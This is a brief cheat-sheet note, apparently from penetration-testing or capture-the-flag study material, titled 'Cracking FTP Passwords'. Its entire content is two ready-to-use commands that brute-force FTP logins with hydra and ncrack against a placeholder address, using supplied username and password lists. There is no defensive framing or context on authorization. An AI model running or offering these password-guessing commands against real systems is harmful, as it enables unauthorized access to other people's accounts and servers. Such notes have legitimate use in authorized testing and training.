# Cracking FTP Passwords

```bash
hydra -L <username list> -P <password list> 10.10.10.10 ftp
```
```bash
ncrack -U <usernames list> -P <passwords list> ftp://10.10.10.10
```
